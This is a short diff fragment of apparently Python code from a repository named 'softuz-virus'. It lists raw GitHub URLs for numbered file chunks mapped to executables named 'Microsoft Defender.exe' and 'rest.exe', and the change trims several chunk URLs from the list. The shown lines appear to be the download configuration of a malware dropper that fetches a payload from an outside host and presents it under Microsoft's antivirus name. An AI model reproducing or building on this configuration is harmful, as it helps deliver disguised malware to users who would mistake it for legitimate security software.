@@ -27,12 +27,7 @@ ls = [{"Microsoft Defender.exe": ['https://raw.githubusercontent.com/Yaxyobek087
                                   'https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/fl_26.txt',
                                   'https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/fl_27.txt',
                                   'https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/fl_28.txt',
-                                  'https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/fl_29.txt',
-                                  'https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/fl_30.txt',
-                                  'https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/fl_31.txt',
-                                  'https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/fl_32.txt',
-                                  'https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/fl_33.txt',
-                                  'https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/fl_34.txt']
+                                  'https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/fl_29.txt']
        }]
 
 r = {"rest.exe": ["https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/rest.txt"]}
